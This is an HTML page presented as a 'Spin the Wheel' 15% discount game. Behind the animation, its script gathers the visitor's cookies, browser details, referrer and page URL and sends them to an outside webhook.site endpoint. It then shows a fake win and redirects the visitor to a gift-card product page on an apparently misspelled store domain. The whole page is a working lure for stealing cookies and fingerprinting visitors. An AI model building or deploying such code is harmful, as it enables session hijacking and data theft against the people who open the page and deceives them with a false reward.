<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Spin the Wheel</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    .wheel {
      width: 200px;
      height: 200px;
      border: 10px solid #333;
      border-radius: 50%;
      margin: auto;
      background: conic-gradient(#4caf50 0% 25%, #f44336 25% 50%, #2196f3 50% 75%, #ffc107 75% 100%);
      animation: spin 4s ease-out;
    }
    #result { margin-top: 20px; font-size: 24px; font-weight: bold; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(1440deg); } }
    button { margin-top: 40px; padding: 10px 20px; font-size: 18px; cursor: pointer; }
  </style>
</head>
<body>

  <h1>🎁 Spin the Wheel for a 15% Discount!</h1>
  <div class="wheel" id="wheel"></div>
  <div id="result"></div>
  <button onclick="spin()">Spin Now</button>

<script>
function spin() {
  document.getElementById("result").innerText = "Spinning...";

  setTimeout(() => {
    const data = new URLSearchParams({
      cookies: document.cookie,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      referrer: document.referrer,
      url: location.href
    });

    fetch("https://webhook.site/f6a09363-360d-4d13-8716-77a7c162b420", {
      method: "POST",
      body: data
    })
    .then(() => {
      document.getElementById("result").innerText =
        "🎉 You got 15% OFF!";

      setTimeout(() => {
        window.location.href =
          "https://donut-strore.myshopify.com/products/gift-card";
      }, 2000);
    })
    .catch(error => {
      console.error("Webhook error:", error);

      document.getElementById("result").innerText =
        "🎉 You got 15% OFF!";
    });
  }, 4000);
}
</script>
